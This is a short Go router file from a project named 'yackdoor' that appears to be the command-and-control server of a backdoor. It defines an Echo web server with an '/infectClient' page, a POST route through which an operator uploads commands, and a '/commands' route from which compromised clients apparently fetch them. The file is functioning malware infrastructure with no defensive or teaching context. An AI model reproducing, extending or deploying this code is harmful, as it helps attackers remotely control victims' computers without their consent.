package router

import (
	"os"

	"github.com/bruh-boys/yackdoor/src/controller"
	"github.com/labstack/echo/v4"
	//"golang.org/x/net/websocket"
)

func SetupRoutes() {
	e := echo.New()
	port, exist := os.LookupEnv("PORT")
	if !exist {
		port = "8080"
	}
	e.GET("/infectClient", func(c echo.Context) error {

		c.File("view/infectClient.html")
		return nil
	})
	e.POST("/infectClient", controller.UploadCommand)
	e.GET("/commands", controller.GetCommands)
	e.Static("/static", "static")

	e.Logger.Fatal(e.Start(":" + port))
}
